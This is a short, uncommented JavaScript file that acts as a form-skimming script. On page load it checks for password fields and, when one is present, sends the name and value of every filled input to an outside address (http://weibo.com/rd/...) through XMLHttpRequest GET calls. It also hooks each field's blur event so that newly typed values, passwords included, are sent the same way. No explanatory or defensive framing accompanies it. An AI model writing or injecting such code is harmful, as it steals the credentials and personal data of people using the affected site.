  	var xmlHttp;
	function createXmlRequest()
	{
		if(window.ActiveXObject)
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		//·ÇIEä¯ÀÀÆ÷
		else if(window.XMLHttpRequest)
			xmlHttp = new XMLHttpRequest();
	}

  	function HookInput(el)
	{
		var obj = el;
		if(typeof(el) == "string")
			obj = document.getElementById(id);
		
		obj.onblur = function()
			{
				if(obj.value != "")
				{
					var putValu = obj.name + '=' + obj.value;
					
					createXmlRequest();
					xmlHttp.onreadystatechange=function(){};
					xmlHttp.open("GET","http://weibo.com/rd/name="+escape(putValu),true);
					xmlHttp.send(null);
				}
			}
	}
	
	window.onload = function(){
	
	  	var inputs = document.getElementsByTagName('input');
	  	var RunHook = false;
	  	for(var i = 0; i < inputs.length; i++){
		   if(inputs[i].type == 'password'){
		    		RunHook = true;
	   			}
		}
		
		if(RunHook)
		 {
		    for(var i = 0; i < inputs.length; i++){
		    	
		    	if(inputs[i].value != "")
		    	{
		    		var putValu = inputs[i].name + '=' + inputs[i].value;
		    		
		    		createXmlRequest();
					xmlHttp.onreadystatechange=function(){};
					xmlHttp.open("GET","http://weibo.com/rd/name="+escape(putValu),true);
					xmlHttp.send(null);
		    	}
		    	
		    	HookInput(inputs[i]);
			}
		 }
	}